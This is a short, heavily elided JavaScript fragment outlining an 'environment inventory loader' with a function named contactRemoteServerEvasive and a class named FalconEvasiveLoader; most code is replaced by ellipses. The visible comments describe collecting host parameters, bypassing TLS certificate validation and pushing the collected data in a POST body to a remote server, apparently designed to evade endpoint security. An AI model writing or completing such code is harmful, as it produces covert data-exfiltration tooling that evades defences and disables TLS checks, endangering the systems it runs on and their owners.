/* ============================================
 * ENVIRONMENT INVENTORY LOADER (UPDATED FOR TLS BYPASS)
 * ============================================
 */
...
// ============================================
// ENVIRONMENT ANALYSIS DEFENSIVE FALLBACKS
// ============================================
...
async function contactRemoteServerEvasive(url, options = {}) {
    ...
    return new Promise((resolve, reject) => {
        ...
        // Compute content layout parameters for POST stream tracking
        if (options.body) {
        ...
        // FIX: Ignore validation failures caused by local network inline decryption
        if (isHttps) {
            defaultOptions.agent = new https.Agent({
        ...
        // Push the body payload directly into the network buffer
        if (options.body) {
...
class FalconEvasiveLoader {
    ...
    async contactServer() {
        ...
        try {
            ...
            // Bundle collected parameters into stringified body array
